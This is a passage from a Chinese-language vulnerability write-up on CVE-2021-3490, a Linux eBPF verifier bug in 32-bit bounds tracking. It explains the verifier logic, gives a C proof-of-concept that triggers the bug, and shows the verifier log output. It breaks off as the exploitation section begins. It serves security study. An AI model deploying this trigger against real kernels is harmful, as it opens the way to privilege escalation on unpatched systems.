<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">static</span> <span class="keyword">void</span> __update_reg64_bounds(struct bpf_reg_state *reg)</span><br><span class="line">&#123;</span><br><span class="line">	<span class="comment">/* min signed is max(sign bit) | min(other bits) */</span></span><br><span class="line">	reg-&gt;smin_value = <span class="keyword">max_t</span>(s64, reg-&gt;smin_value,</span><br><span class="line">				reg-&gt;var_off.value | (reg-&gt;var_off.mask &amp; S64_MIN));</span><br><span class="line">	<span class="comment">/* max signed is min(sign bit) | max(other bits) */</span></span><br><span class="line">	reg-&gt;smax_value = <span class="keyword">min_t</span>(s64, reg-&gt;smax_value,</span><br><span class="line">				reg-&gt;var_off.value | (reg-&gt;var_off.mask &amp; S64_MAX));</span><br><span class="line">	reg-&gt;umin_value = max(reg-&gt;umin_value, reg-&gt;var_off.value);</span><br><span class="line">	reg-&gt;umax_value = min(reg-&gt;umax_value,</span><br><span class="line">			      reg-&gt;var_off.value | reg-&gt;var_off.mask);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<ul>
<li>计算方法如下：<ul>
<li>最小边界值 = <code>[min_value , var_off.value | (var_off.mask &amp; MIN) ]</code> 中的最大者</li>
<li>最大边界值 = <code>[max_value , var_off.value | (var_off.mask &amp; MAX) ]</code> 中的最小者</li>
</ul>
</li>
</ul>
<p>但这样存在一个问题，若存在一个高32位 <code>unknown</code> 低32位 <code>known</code> 的寄存器：</p>
<ul>
<li>在理论上，程序执行时 <code>scalar32_min_max_and</code> 就能确定该寄存器的值，应该调用 <code>__mark_reg_known</code> 进行更新</li>
<li>但程序认为在 <code>scalar_min_max_and</code> 中也能检查寄存器是否 <code>known</code>，因此选择在 <code>scalar_min_max_and</code> 中调用 <code>__mark_reg_known</code>，而 <code>scalar32_min_max_and</code> 中直接返回</li>
<li>核心问题就是，函数 <code>scalar32_min_max_and</code> 和 <code>scalar_min_max_and</code> 中判断寄存器是否 <code>known</code> 的条件不同，导致原本应该执行 <code>__mark_reg_known</code> 的程序没有执行</li>
</ul>
<p>如果有以下两个寄存器：</p>
<ul>
<li><code>R2 = &#123; .value = 0x1, .mask = 0xffffffff00000000 &#125;</code>：该寄存器低 32 位值已知为 <code>0x1</code>，高 32 位不确定</li>
<li><code>R3 = &#123; .value = 0x100000002, .mask = 0x0 &#125;</code>：该寄存器 64 位值全部已知，为 <code>0x100000002</code></li>
</ul>
<p>假如我们将 R2 与 R3 做与运算，其结果为 <code>&#123; .value = 0, .mask = 0x100000000 &#125;</code>，详细调用过程如下：</p>
<ul>
<li>首先执行 <code>adjust_scalar_min_max_vals</code> 函数，随后会进入 <code>tnum_and</code> 函数<ul>
<li>该函数返回 <code>R2.var_off = &#123;mask = 0x100000000; value=0x0&#125;</code></li>
<li>由于 <code>R2</code> 的高32位是不确定，导致 <code>0x100000002</code> 中高出32位的非“0”部分不确定，所以最终 <code>R2.var_off.mask = 0x100000000</code>（仅有第32位不确定）</li>
</ul>
</li>
<li>然后执行 <code>scalar32_min_max_and</code> 检查寄存器32位的值的范围<ul>
<li>这里由于 <code>R2</code> 和 <code>R3</code> 两个寄存器的低32位的值都是确定的，该函数直接返回</li>
</ul>
</li>
<li>接着执行 <code>scalar_min_max_and</code> 检查寄存器64位的值的范围<ul>
<li>由于 <code>R2</code> 寄存器第32位仍不确定，因此不会调用 <code>__mark_reg_known</code></li>
</ul>
</li>
<li>在末尾调用 <code>__update_reg_bounds</code>，这个函数会对 <code>R2</code> 的值做相应修改：<ul>
<li>设置 <code>R2.u32_max_value=0x0</code>（由于 <code>R2.var_off.value=0 &lt; R2.u32_max_value=1</code>）</li>
<li>设置 <code>R2.u32_min_value=0x1</code>（由于 <code>R2.var_off.value=0 &lt; R2.u32_min_value=1</code>）</li>
</ul>
</li>
<li>最后执行 <code>__reg_bound_offset</code> 函数，也不会改变 <code>R2</code> 的属性</li>
</ul>
<p>因此经过该轮计算之后 R2 的最小值为 <code>1</code>，最大值为 <code>0</code>，而这显然是不合理的</p>
<p>测试样例如下：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> _GNU_SOURCE</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;pthread.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;errno.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;signal.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;poll.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdint.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/mman.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/syscall.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/ioctl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/sem.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/socket.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/ipc.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/msg.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/wait.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;semaphore.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;poll.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sched.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;ctype.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&quot;kernelpwn.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&quot;bpf_tools.h&quot;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> MAP_SIZE 0x2000</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> POC_PROG(__map_fd)                              \</span></span><br><span class="line"><span class="meta">        <span class="comment">/* Load value from map */</span>                       \</span></span><br><span class="line"><span class="meta">        BPF_LD_MAP_FD(BPF_REG_9, __map_fd),             \ <span class="comment">/* r9 = 0 */</span></span></span><br><span class="line">        BPF_MOV64_REG(BPF_REG_1, BPF_REG_9),            \ <span class="comment">/* r1 = r9 */</span></span><br><span class="line">        BPF_MOV64_REG(BPF_REG_2, BPF_REG_10),           \ <span class="comment">/* r2 = r10(rbp) */</span></span><br><span class="line">        BPF_ALU64_IMM(BPF_ADD, BPF_REG_2, <span class="number">-8</span>),          \ <span class="comment">/* r2 += -8 */</span></span><br><span class="line">        BPF_ST_MEM(BPF_DW, BPF_REG_2, <span class="number">0</span>, <span class="number">0</span>),            \ <span class="comment">/* *(r2 + 0) = 0 */</span></span><br><span class="line">        BPF_RAW_INSN(BPF_JMP | BPF_CALL, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, BPF_FUNC_map_lookup_elem), \</span><br><span class="line">        <span class="comment">/* if success, r0 will be ptr to value, 0 for failed */</span>              \</span><br><span class="line">        BPF_JMP_IMM(BPF_JNE, BPF_REG_0, <span class="number">0</span>, <span class="number">1</span>),          \ <span class="comment">/* if r0 != 0x0 goto pc+1 */</span></span><br><span class="line">        BPF_EXIT_INSN(),                                \ <span class="comment">/* jmp exit */</span></span><br><span class="line">        <span class="comment">/* load value into r2, make it part-unknown */</span>  \</span><br><span class="line">        BPF_LDX_MEM(BPF_DW, BPF_REG_2, BPF_REG_0, <span class="number">0</span>),   \ <span class="comment">/* r2 = *(r0 + 0) */</span></span><br><span class="line">        BPF_MOV64_IMM(BPF_REG_4, <span class="number">0xffffffff</span>),           \ <span class="comment">/* r4 = -1 */</span></span><br><span class="line">        BPF_ALU64_IMM(BPF_LSH, BPF_REG_4, <span class="number">32</span>),          \ <span class="comment">/* r4 &lt;&lt;= 32 */</span></span><br><span class="line">        BPF_ALU64_REG(BPF_AND, BPF_REG_2, BPF_REG_4),   \ <span class="comment">/* r2 &amp;= r4 */</span></span><br><span class="line">        BPF_ALU64_IMM(BPF_ADD, BPF_REG_2, <span class="number">0x1</span>),         \ <span class="comment">/* r2 += 1 */</span></span><br><span class="line">        <span class="comment">/* r3 = 0x100000002 */</span>                          \ </span><br><span class="line">        BPF_MOV64_IMM(BPF_REG_3, <span class="number">0x1</span>),                  \ <span class="comment">/* r3 = 1 */</span></span><br><span class="line">        BPF_ALU64_IMM(BPF_LSH, BPF_REG_3, <span class="number">32</span>),          \ <span class="comment">/* r3 &lt;&lt;= 32 */</span></span><br><span class="line">        BPF_ALU64_IMM(BPF_ADD, BPF_REG_3, <span class="number">0x2</span>),         \ <span class="comment">/* r3 += 2 */</span></span><br><span class="line">        <span class="comment">/* triger the vulnerability */</span>                  \</span><br><span class="line">        BPF_ALU64_REG(BPF_AND, BPF_REG_2, BPF_REG_3)	  <span class="comment">/* r2 &amp;= r3 */</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc , <span class="keyword">char</span> **argv, <span class="keyword">char</span> **envp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> map_fd;</span><br><span class="line">    <span class="keyword">int</span> key;</span><br><span class="line">    <span class="keyword">size_t</span> value[<span class="number">0x1000</span>];</span><br><span class="line">    <span class="keyword">int</span> log_fd;</span><br><span class="line"></span><br><span class="line">    map_fd = bpf_map_create(BPF_MAP_TYPE_ARRAY, <span class="number">4</span>, MAP_SIZE, <span class="number">0x100</span>);</span><br><span class="line">    <span class="keyword">if</span> (map_fd &lt; <span class="number">0</span>) &#123;</span><br><span class="line">        err_exit(<span class="string">&quot;FAILED to create eBPF map!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    key = <span class="number">0</span>;</span><br><span class="line">    value[<span class="number">0</span>] = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">if</span> (bpf_map_update_elem(map_fd, &amp;key, &amp;value, <span class="number">0</span>) &lt; <span class="number">0</span>) &#123;</span><br><span class="line">        err_exit(<span class="string">&quot;FAILED to load value into map!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">bpf_insn</span> <span class="title">prog</span>[] =</span> &#123;</span><br><span class="line">        POC_PROG(map_fd),</span><br><span class="line">        BPF_EXIT_INSN()</span><br><span class="line">    &#125;;</span><br><span class="line">    run_bpf_prog(prog, <span class="keyword">sizeof</span>(prog) / <span class="keyword">sizeof</span>(prog[<span class="number">0</span>]), <span class="number">2</span>, <span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><span class="line">/ $ ./<span class="built_in">exp</span></span><br><span class="line">func#<span class="number">0</span> @<span class="number">0</span></span><br><span class="line"><span class="number">0</span>: R1=ctx(id=<span class="number">0</span>,off=<span class="number">0</span>,imm=<span class="number">0</span>) R10=fp0</span><br><span class="line"><span class="number">0</span>: (<span class="number">18</span>) r9 = <span class="number">0x0</span></span><br><span class="line"><span class="number">2</span>: R1=ctx(id=<span class="number">0</span>,off=<span class="number">0</span>,imm=<span class="number">0</span>) R9_w=map_ptr(id=<span class="number">0</span>,off=<span class="number">0</span>,ks=<span class="number">4</span>,vs=<span class="number">8192</span>,imm=<span class="number">0</span>) R10=fp0</span><br><span class="line"><span class="number">2</span>: (bf) r1 = r9</span><br><span class="line"><span class="number">4</span>: (<span class="number">07</span>) r2 += <span class="number">-8</span></span><br><span class="line"><span class="number">2</span>: (bf) r1 = r9</span><br><span class="line"><span class="number">3</span>: R1_w=map_ptr(id=<span class="number">0</span>,off=<span class="number">0</span>,ks=<span class="number">4</span>,vs=<span class="number">8192</span>,imm=<span class="number">0</span>) R9_w=map_ptr(id=<span class="number">0</span>,off=<span class="number">0</span>,ks=<span class="number">4</span>,vs=<span class="number">8192</span>,imm=<span class="number">0</span>) R10=fp0</span><br><span class="line"><span class="number">3</span>: (bf) r2 = r10</span><br><span class="line"><span class="number">4</span>: R1_w=map_ptr(id=<span class="number">0</span>,off=<span class="number">0</span>,ks=<span class="number">4</span>,vs=<span class="number">8192</span>,imm=<span class="number">0</span>) R2_w=fp0 R9_w=map_ptr(id=<span class="number">0</span>,off=<span class="number">0</span>,ks=<span class="number">4</span>,vs=<span class="number">8192</span>,imm=<span class="number">0</span>) R10=fp0</span><br><span class="line"><span class="number">4</span>: (<span class="number">07</span>) r2 += <span class="number">-8</span></span><br><span class="line"><span class="number">5</span>: R1_w=map_ptr(id=<span class="number">0</span>,off=<span class="number">0</span>,ks=<span class="number">4</span>,vs=<span class="number">8192</span>,imm=<span class="number">0</span>) R2_w=fp<span class="number">-8</span> R9_w=map_ptr(id=<span class="number">0</span>,off=<span class="number">0</span>,ks=<span class="number">4</span>,vs=<span class="number">8192</span>,imm=<span class="number">0</span>) R10=fp0</span><br><span class="line"><span class="number">5</span>: (<span class="number">7</span>a) *(u64 *)(r2 +<span class="number">0</span>) = <span class="number">0</span></span><br><span class="line"><span class="number">6</span>: R1_w=map_ptr(id=<span class="number">0</span>,off=<span class="number">0</span>,ks=<span class="number">4</span>,vs=<span class="number">8192</span>,imm=<span class="number">0</span>) R2_w=fp<span class="number">-8</span> R9_w=map_ptr(id=<span class="number">0</span>,off=<span class="number">0</span>,ks=<span class="number">4</span>,vs=<span class="number">8192</span>,imm=<span class="number">0</span>) R10=fp0 fp<span class="number">-8</span>_w=mmmmmmmm</span><br><span class="line"><span class="number">6</span>: (<span class="number">85</span>) call bpf_map_lookup_elem#<span class="number">1</span></span><br><span class="line"><span class="number">7</span>: R0_w=map_value_or_null(id=<span class="number">1</span>,off=<span class="number">0</span>,ks=<span class="number">4</span>,vs=<span class="number">8192</span>,imm=<span class="number">0</span>) R9_w=map_ptr(id=<span class="number">0</span>,off=<span class="number">0</span>,ks=<span class="number">4</span>,vs=<span class="number">8192</span>,imm=<span class="number">0</span>) R10=fp0 fp<span class="number">-8</span>_w=mmmmmmmm</span><br><span class="line"><span class="number">7</span>: (<span class="number">55</span>) <span class="keyword">if</span> r0 != <span class="number">0x0</span> <span class="keyword">goto</span> pc+<span class="number">1</span></span><br><span class="line"> R0_w=invP0 R9_w=map_ptr(id=<span class="number">0</span>,off=<span class="number">0</span>,ks=<span class="number">4</span>,vs=<span class="number">8192</span>,imm=<span class="number">0</span>) R10=fp0 fp<span class="number">-8</span>_w=mmmmmmmm</span><br><span class="line"><span class="number">8</span>: R0_w=invP0 R9_w=map_ptr(id=<span class="number">0</span>,off=<span class="number">0</span>,ks=<span class="number">4</span>,vs=<span class="number">8192</span>,imm=<span class="number">0</span>) R10=fp0 fp<span class="number">-8</span>_w=mmmmmmmm</span><br><span class="line"><span class="number">8</span>: (<span class="number">95</span>) <span class="built_in">exit</span></span><br><span class="line"><span class="number">9</span>: R0=map_value(id=<span class="number">0</span>,off=<span class="number">0</span>,ks=<span class="number">4</span>,vs=<span class="number">8192</span>,imm=<span class="number">0</span>) R9=map_ptr(id=<span class="number">0</span>,off=<span class="number">0</span>,ks=<span class="number">4</span>,vs=<span class="number">8192</span>,imm=<span class="number">0</span>) R10=fp0 fp<span class="number">-8</span>=mmmmmmmm</span><br><span class="line"><span class="number">9</span>: (<span class="number">79</span>) r2 = *(u64 *)(r0 +<span class="number">0</span>)</span><br><span class="line"> R0=map_value(id=<span class="number">0</span>,off=<span class="number">0</span>,ks=<span class="number">4</span>,vs=<span class="number">8192</span>,imm=<span class="number">0</span>) R9=map_ptr(id=<span class="number">0</span>,off=<span class="number">0</span>,ks=<span class="number">4</span>,vs=<span class="number">8192</span>,imm=<span class="number">0</span>) R10=fp0 fp<span class="number">-8</span>=mmmmmmmm</span><br><span class="line"><span class="number">10</span>: R0=map_value(id=<span class="number">0</span>,off=<span class="number">0</span>,ks=<span class="number">4</span>,vs=<span class="number">8192</span>,imm=<span class="number">0</span>) R2_w=invP(id=<span class="number">0</span>) R9=map_ptr(id=<span class="number">0</span>,off=<span class="number">0</span>,ks=<span class="number">4</span>,vs=<span class="number">8192</span>,imm=<span class="number">0</span>) R10=fp0 fp<span class="number">-8</span>=mmmmmmmm</span><br><span class="line"><span class="number">10</span>: (b7) r4 = <span class="number">-1</span></span><br><span class="line"><span class="number">11</span>: R0=map_value(id=<span class="number">0</span>,off=<span class="number">0</span>,ks=<span class="number">4</span>,vs=<span class="number">8192</span>,imm=<span class="number">0</span>) R2_w=invP(id=<span class="number">0</span>) R4_w=invP<span class="number">-1</span> R9=map_ptr(id=<span class="number">0</span>,off=<span class="number">0</span>,ks=<span class="number">4</span>,vs=<span class="number">8192</span>,imm=<span class="number">0</span>) R10=fp0 fp<span class="number">-8</span>=mmmmmmmm</span><br><span class="line"><span class="number">11</span>: (<span class="number">67</span>) r4 &lt;&lt;= <span class="number">32</span> <span class="comment">/* r4=0xffffffff00000000 */</span></span><br><span class="line"><span class="number">12</span>: R0=map_value(id=<span class="number">0</span>,off=<span class="number">0</span>,ks=<span class="number">4</span>,vs=<span class="number">8192</span>,imm=<span class="number">0</span>) R2_w=invP(id=<span class="number">0</span>) R4_w=invP<span class="number">-4294967296</span> R9=map_ptr(id=<span class="number">0</span>,off=<span class="number">0</span>,ks=<span class="number">4</span>,vs=<span class="number">8192</span>,imm=<span class="number">0</span>) R10=fp0 fp<span class="number">-8</span>=mmmmmmmm</span><br><span class="line"><span class="number">12</span>: (<span class="number">5f</span>) r2 &amp;= r4 <span class="comment">/* 取r2的高32位 */</span></span><br><span class="line"><span class="number">13</span>: R0=map_value(id=<span class="number">0</span>,off=<span class="number">0</span>,ks=<span class="number">4</span>,vs=<span class="number">8192</span>,imm=<span class="number">0</span>) R2_w=invP(id=<span class="number">0</span>,smax_value=<span class="number">9223372032559808512</span>,umax_value=<span class="number">18446744069414584320</span>,var_off=(<span class="number">0x0</span>; <span class="number">0xffffffff00000000</span>),s32_min_value=<span class="number">0</span>,s32_max_value=<span class="number">0</span>,u32_max_val</span><br><span class="line">ue=<span class="number">0</span>) R4_w=invP<span class="number">-4294967296</span> R9=map_ptr(id=<span class="number">0</span>,off=<span class="number">0</span>,ks=<span class="number">4</span>,vs=<span class="number">8192</span>,imm=<span class="number">0</span>) R10=fp0 fp<span class="number">-8</span>=mmmmmmmm</span><br><span class="line"><span class="number">13</span>: (<span class="number">07</span>) r2 += <span class="number">1</span></span><br><span class="line"><span class="number">14</span>: R0=map_value(id=<span class="number">0</span>,off=<span class="number">0</span>,ks=<span class="number">4</span>,vs=<span class="number">8192</span>,imm=<span class="number">0</span>) R2_w=invP(id=<span class="number">0</span>,smin_value=<span class="number">-9223372036854775807</span>,smax_value=<span class="number">9223372032559808513</span>,umin_value=<span class="number">1</span>,umax_value=<span class="number">18446744069414584321</span>,var_off=(<span class="number">0x1</span>; <span class="number">0xffffffff00000000</span></span><br><span class="line">),s32_min_value=<span class="number">1</span>,s32_max_value=<span class="number">1</span>,u32_max_value=<span class="number">1</span>) R4_w=invP<span class="number">-4294967296</span> R9=map_ptr(id=<span class="number">0</span>,off=<span class="number">0</span>,ks=<span class="number">4</span>,vs=<span class="number">8192</span>,imm=<span class="number">0</span>) R10=fp0 fp<span class="number">-8</span>=mmmmmmmm</span><br><span class="line">    <span class="comment">/* r2=&#123;s32_min_value=1,s32_max_value=1&#125;,var_off=(0x1; 0xffffffff00000000) */</span></span><br><span class="line"><span class="number">14</span>: (b7) r3 = <span class="number">1</span></span><br><span class="line"><span class="number">15</span>: R0=map_value(id=<span class="number">0</span>,off=<span class="number">0</span>,ks=<span class="number">4</span>,vs=<span class="number">8192</span>,imm=<span class="number">0</span>) R2_w=invP(id=<span class="number">0</span>,smin_value=<span class="number">-9223372036854775807</span>,smax_value=<span class="number">9223372032559808513</span>,umin_value=<span class="number">1</span>,umax_value=<span class="number">18446744069414584321</span>,var_off=(<span class="number">0x1</span>; <span class="number">0xffffffff00000000</span></span><br><span class="line">),s32_min_value=<span class="number">1</span>,s32_max_value=<span class="number">1</span>,u32_max_value=<span class="number">1</span>) R3_w=invP1 R4_w=invP<span class="number">-4294967296</span> R9=map_ptr(id=<span class="number">0</span>,off=<span class="number">0</span>,ks=<span class="number">4</span>,vs=<span class="number">8192</span>,imm=<span class="number">0</span>) R10=fp0 fp<span class="number">-8</span>=mmmmmmmm</span><br><span class="line"><span class="number">15</span>: (<span class="number">67</span>) r3 &lt;&lt;= <span class="number">32</span></span><br><span class="line"><span class="number">16</span>: R0=map_value(id=<span class="number">0</span>,off=<span class="number">0</span>,ks=<span class="number">4</span>,vs=<span class="number">8192</span>,imm=<span class="number">0</span>) R2_w=invP(id=<span class="number">0</span>,smin_value=<span class="number">-9223372036854775807</span>,smax_value=<span class="number">9223372032559808513</span>,umin_value=<span class="number">1</span>,umax_value=<span class="number">18446744069414584321</span>,var_off=(<span class="number">0x1</span>; <span class="number">0xffffffff00000000</span></span><br><span class="line">),s32_min_value=<span class="number">1</span>,s32_max_value=<span class="number">1</span>,u32_max_value=<span class="number">1</span>) R3_w=invP4294967296 R4_w=invP<span class="number">-4294967296</span> R9=map_ptr(id=<span class="number">0</span>,off=<span class="number">0</span>,ks=<span class="number">4</span>,vs=<span class="number">8192</span>,imm=<span class="number">0</span>) R10=fp0 fp<span class="number">-8</span>=mmmmmmmm</span><br><span class="line"><span class="number">16</span>: (<span class="number">07</span>) r3 += <span class="number">2</span> <span class="comment">/* r3=0x100000002 */</span></span><br><span class="line"><span class="number">17</span>: R0=map_value(id=<span class="number">0</span>,off=<span class="number">0</span>,ks=<span class="number">4</span>,vs=<span class="number">8192</span>,imm=<span class="number">0</span>) R2_w=invP(id=<span class="number">0</span>,smin_value=<span class="number">-9223372036854775807</span>,smax_value=<span class="number">9223372032559808513</span>,umin_value=<span class="number">1</span>,umax_value=<span class="number">18446744069414584321</span>,var_off=(<span class="number">0x1</span>; <span class="number">0xffffffff00000000</span></span><br><span class="line">),s32_min_value=<span class="number">1</span>,s32_max_value=<span class="number">1</span>,u32_max_value=<span class="number">1</span>) R3_w=invP4294967298 R4_w=invP<span class="number">-4294967296</span> R9=map_ptr(id=<span class="number">0</span>,off=<span class="number">0</span>,ks=<span class="number">4</span>,vs=<span class="number">8192</span>,imm=<span class="number">0</span>) R10=fp0 fp<span class="number">-8</span>=mmmmmmmm</span><br><span class="line">    <span class="comment">/* r2=&#123;s32_min_value=1,s32_max_value=1&#125;,var_off=(0x1; 0xffffffff00000000) </span></span><br><span class="line"><span class="comment">	  r3=0x100000002,var_off=(0x100000002; 0x0) */</span></span><br><span class="line"><span class="number">17</span>: (<span class="number">5f</span>) r2 &amp;= r3</span><br><span class="line"><span class="number">18</span>: R0=map_value(id=<span class="number">0</span>,off=<span class="number">0</span>,ks=<span class="number">4</span>,vs=<span class="number">8192</span>,imm=<span class="number">0</span>) R2_w=invP(id=<span class="number">0</span>,umax_value=<span class="number">4294967296</span>,var_off=(<span class="number">0x0</span>; <span class="number">0x100000000</span>),s32_min_value=<span class="number">1</span>,s32_max_value=<span class="number">0</span>,u32_min_value=<span class="number">1</span>,u32_max_value=<span class="number">0</span>) R3_w=invP4294967298 R4_w=i</span><br><span class="line">nvP<span class="number">-4294967296</span> R9=map_ptr(id=<span class="number">0</span>,off=<span class="number">0</span>,ks=<span class="number">4</span>,vs=<span class="number">8192</span>,imm=<span class="number">0</span>) R10=fp0 fp<span class="number">-8</span>=mmmmmmmm</span><br><span class="line">    <span class="comment">/* 注意r2中&#123;s32_min_value=1,s32_max_value=0&#125;,证明漏洞已经生效 */</span></span><br><span class="line"><span class="number">18</span>: (<span class="number">95</span>) <span class="built_in">exit</span></span><br><span class="line">R0 leaks addr as <span class="keyword">return</span> value</span><br><span class="line">processed <span class="number">18</span> insns (limit <span class="number">1000000</span>) max_states_per_insn <span class="number">0</span> total_states <span class="number">1</span> peak_states <span class="number">1</span> mark_read <span class="number">1</span></span><br></pre></td></tr></table></figure>
<p><strong>入侵思路</strong></p>
<p>核心思路参考：<a target="_blank" rel="noopener" href="https://buaq.net/go-167631.html">[漏洞分析] 【CVE-2021-3490】eBPF verifier 32 位边界计算错误漏洞分析与利用 (buaq.net)</a> </p>
<p>利用漏洞构造一个最小边界值为 “1”、最大边界值为 “0” 的寄存器： </p>
